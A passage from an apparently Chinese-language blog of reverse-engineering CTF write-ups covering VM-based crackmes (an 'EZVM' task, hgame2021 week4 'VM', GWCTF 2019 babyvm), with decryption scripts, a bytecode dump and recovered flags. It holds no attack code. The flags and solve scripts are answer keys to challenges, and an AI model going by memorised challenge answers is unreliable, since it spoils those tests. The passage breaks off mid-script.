class="number">97</span>&lt;=i&lt;=<span class="number">122</span>):</span><br><span class="line">        i=i^<span class="number">71</span>-<span class="number">1</span></span><br><span class="line">    tmp1=tmp1%<span class="number">16</span></span><br><span class="line">    code1.append(tmp1)<span class="comment">#先push余数</span></span><br><span class="line">    tmp2=tmp2//<span class="number">16</span></span><br><span class="line">    code1.append(tmp2)<span class="comment">#后push商</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(code[::-<span class="number">1</span>]==code1):</span><br><span class="line">    print(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写出脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">code=[<span class="number">0x7</span>,<span class="number">0xd</span>,<span class="number">0x0</span>,<span class="number">0x5</span>,<span class="number">0x1</span>,<span class="number">0xc</span>,<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0xd</span>,<span class="number">0x5</span>,<span class="number">0xf</span>,<span class="number">0x0</span>,<span class="number">0x9</span>,<span class="number">0x5</span>,<span class="number">0xf</span>,<span class="number">0x3</span>,<span class="number">0x0</span>,<span class="number">0x2</span>,<span class="number">0x5</span>,<span class="number">0x3</span>,<span class="number">0x3</span>,<span class="number">0x1</span>,<span class="number">0x7</span>,<span class="number">0x7</span>,<span class="number">0xb</span>,<span class="number">0x2</span>,<span class="number">0x1</span>,<span class="number">0x2</span>,<span class="number">0x7</span>,<span class="number">0x2</span>,<span class="number">0xc</span>,<span class="number">0x2</span>,<span class="number">0x2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>,<span class="number">2</span>):</span><br><span class="line">    tmp=code[i]*<span class="number">16</span>+code[i+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">97</span>&lt;=((tmp-<span class="number">1</span>)^<span class="number">71</span>)&lt;=<span class="number">122</span>):</span><br><span class="line">        flag+=<span class="built_in">chr</span>((tmp-<span class="number">1</span>)^<span class="number">71</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">65</span>&lt;=((tmp+<span class="number">1</span>)^<span class="number">75</span>)&lt;=<span class="number">90</span>):</span><br><span class="line">        flag+=<span class="built_in">chr</span>((tmp+<span class="number">1</span>)^<span class="number">75</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(tmp)</span><br><span class="line">    tmp=<span class="number">0</span></span><br><span class="line">print(flag[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#flag&#123;Such_A_EZVM&#125;</span></span><br></pre></td></tr></table></figure><h2 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h2><p>hagame2021 week4的vm</p><p>这道题给我感觉说是vm，但是感觉不完全是，是了但不完全是，哈哈哈。</p><p>这个主要是switch-case语句来进行的加密，解法感觉就是动调得到加密规律吧，耐心慢慢的调，找到规律后就可以下断点F9了。</p><p>大概分析一下吧，先是main函数，里面的gets函数可以看出长度&lt;=34<br><img src="https://i.loli.net/2021/07/15/zRSOeiZFd6XI2rl.png"><br>然后就是那个加密函数了，就是通过switch-case一直处理程序自己生成好的opcode，先浏览一遍输入的数据(循环了很多轮)，然后对这个输入的字符串字符串倒序加密，先异或一轮然后，减一轮。</p><p>5个地址代表的含义<br><img src="https://i.loli.net/2021/07/15/8oPWledO6DJ7KaL.png"></p><p>然后就是下断点看加密了。<br><img src="https://i.loli.net/2021/07/15/Sa6uwqNKykpJZH8.png"><br><img src="https://i.loli.net/2021/07/15/76SJXh9muB8Abgr.png"></p><p>脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//hgame&#123;abcdefgghijklmnopqrstuvwxyz&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> code[]=&#123;  <span class="number">0xCF</span>, <span class="number">0xBF</span>, <span class="number">0x80</span>, <span class="number">0x3B</span>, <span class="number">0xF6</span>, <span class="number">0xAF</span>, <span class="number">0x7E</span>, <span class="number">0x02</span>, <span class="number">0x24</span>, <span class="number">0xED</span>, </span><br><span class="line">  <span class="number">0x70</span>, <span class="number">0x3A</span>, <span class="number">0xF4</span>, <span class="number">0xEB</span>, <span class="number">0x7A</span>, <span class="number">0x4A</span>, <span class="number">0xE7</span>, <span class="number">0xF7</span>, <span class="number">0xA2</span>, <span class="number">0x67</span>, </span><br><span class="line">  <span class="number">0x17</span>, <span class="number">0xF0</span>, <span class="number">0xC6</span>, <span class="number">0x76</span>, <span class="number">0x36</span>, <span class="number">0xE8</span>, <span class="number">0xAD</span>, <span class="number">0x82</span>, <span class="number">0x2E</span>, <span class="number">0xDB</span>, </span><br><span class="line">  <span class="number">0xB7</span>, <span class="number">0x4F</span>, <span class="number">0xE6</span>, <span class="number">0x09</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">char</span> xor_num[]=&#123;<span class="number">0xfe</span>,<span class="number">0x21</span>,<span class="number">0x44</span>,<span class="number">0x67</span>,<span class="number">0x8a</span>,<span class="number">0xad</span>,<span class="number">0xd0</span>,<span class="number">0xf3</span>,<span class="number">0x16</span>,<span class="number">0x39</span>,<span class="number">0x5c</span>,<span class="number">0x7f</span>,<span class="number">0xa3</span>,<span class="number">0xc5</span>,<span class="number">0xe8</span>,<span class="number">0x0b</span>,<span class="number">0x2e</span>,<span class="number">0x51</span>,<span class="number">0x74</span>,<span class="number">0x97</span>,<span class="number">0xba</span>,<span class="number">0xdd</span>,<span class="number">0x0</span>,<span class="number">0x23</span>,<span class="number">0x46</span>,<span class="number">0x69</span>,<span class="number">0x8c</span>,<span class="number">0xaf</span>,<span class="number">0xd2</span>,<span class="number">0xf5</span>,<span class="number">0x18</span>,<span class="number">0x3b</span>,<span class="number">0x5e</span>,<span class="number">0x81</span>&#125;; </span><br><span class="line"><span class="keyword">char</span> sub[] = &#123; <span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFB</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span>,<span class="number">0xBA</span>,<span class="number">0x5A</span>,<span class="number">0xFA</span>,<span class="number">0x9A</span>,<span class="number">0x3A</span>,<span class="number">0xDA</span>,<span class="number">0x7A</span>,<span class="number">0x1A</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">33</span>;i&lt;<span class="number">34</span>;i++,j--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,(code[i]+sub[j])^xor_num[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//hgame&#123;w0W!itS_CpP_wItH_little_vM!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="GWCTF-2019-babyvm"><a href="#GWCTF-2019-babyvm" class="headerlink" title="[GWCTF 2019]babyvm"></a>[GWCTF 2019]babyvm</h2><p>一道比较正宗的vm，还设置了错误解。还是慢慢分析。<br><img src="https://i.loli.net/2021/07/16/hNJWK2jcP5mEuYU.png"><br>对每一个函数分析之后就可以写脚本来还原程序流程了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">code=[  <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>,</span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x23</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>,</span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x26</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>,</span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>,</span><br><span class="line">  <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0C</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2D</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>,</span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x30</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>,</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>,</span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>,</span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>,</span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x05</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE3</span>, <span class="number">0x09</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>,</span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0xE3</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>,</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>,</span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>,</span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>]</span><br><span class="line">reg_table=&#123;</span><br><span class="line">    <span class="number">0xe1</span>:<span class="string">&#x27;eax&#x27;</span>,</span><br><span class="line">    <span class="number">0xe2</span>:<span class="string">&#x27;ebx&#x27;</span>,</span><br><span class="line">    <span class="number">0xe3</span>:<span class="string">&#x27;ecx&#x27;</span>,</span><br><span class="line">    <span class="number">0xe5</span>:<span class="string">&#x27;edx&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">instructions=&#123;</span><br><span class="line">    <span class="number">0xF1</span>: <span class="string">&#x27;mov&#x27;</span>,</span><br><span class="line">    <span class="number">0xF2</span>: <span class="string">&#x27;xor&#x27;</span>,</span><br><span class="line">    <span class="number">0xF4</span>: <span class="string">&#x27;nop&#x27;</span>,</span><br><span class="line">    <span class="number">0xF5</span>:<span class="string">&#x27;read_strlen&#x27;</span>,</span><br><span class="line">    <span class="number">0xF6</span>: <span class="string">&#x27;jishuan&#x27;</span>,</span><br><span class="line">    <span class="number">0xF7</span>: <span class="string">&#x27;mul&#x27;</span>,</span><br><span class="line">    <span class="number">0xF8</span>: <span class="string">&#x27;swap&#x27;</span>&#125;</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">    <span class="keyword">if</span>(code[i]==<span class="number">0xF1</span>):</span><br><span class="line">        print(<span class="string">&#x27;mov &#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span 